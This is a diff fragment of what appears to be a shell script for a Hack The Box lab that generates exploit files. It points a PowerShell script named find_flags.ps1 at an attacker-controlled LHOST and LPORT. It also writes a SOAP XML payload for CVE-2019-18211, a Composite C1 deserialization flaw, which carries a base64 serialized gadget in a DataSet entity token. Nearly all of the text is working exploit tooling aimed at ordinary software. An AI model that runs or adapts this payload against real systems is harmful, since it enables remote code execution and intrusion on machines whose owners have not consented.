@@ -13,20 +13,18 @@ mkdir -p "${WORKDIR}/www"
 sed "s|http://10.10.14.4:9001|http://${LHOST}:${LPORT}|g" "${WORKDIR}/find_flags.ps1" > "${WORKDIR}/www/find_flags.ps1"
 echo "[+] Created www/find_flags.ps1"
 
-# Create XML payload (CVE-2019-18211)
+# Create XML payload (CVE-2019-18211 - A1 HTB format)
 cat > "${WORKDIR}/www/payload.xml" << XMLEOF
 <?xml version="1.0" encoding="utf-8"?>
-<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:man="http://www.composite.net/ns/management">
-  <soap:Header/>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body>
-    <man:GetMultipleChildren>
-      <man:clientProviderNameEntityTokenPairs>
-        <man:RefreshChildrenParams>
-          <man:ProviderName>test</man:ProviderName>
-          <man:EntityToken>entityTokenType='Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter' entityToken='${PAYLOAD_B64}'</man:EntityToken>
-        </man:RefreshChildrenParams>
-      </man:clientProviderNameEntityTokenPairs>
-    </man:GetMultipleChildren>
+    <GetMultipleChildren xmlns="http://www.composite.net/ns/management">
+      <clientProviderNameEntityTokenPairs>
+        <RefreshChildrenParams>
+          <EntityToken>entityTokenType='System.Data.DataSet' entityToken='${PAYLOAD_B64}'</EntityToken>
+        </RefreshChildrenParams>
+      </clientProviderNameEntityTokenPairs>
+    </GetMultipleChildren>
   </soap:Body>
 </soap:Envelope>
 XMLEOF
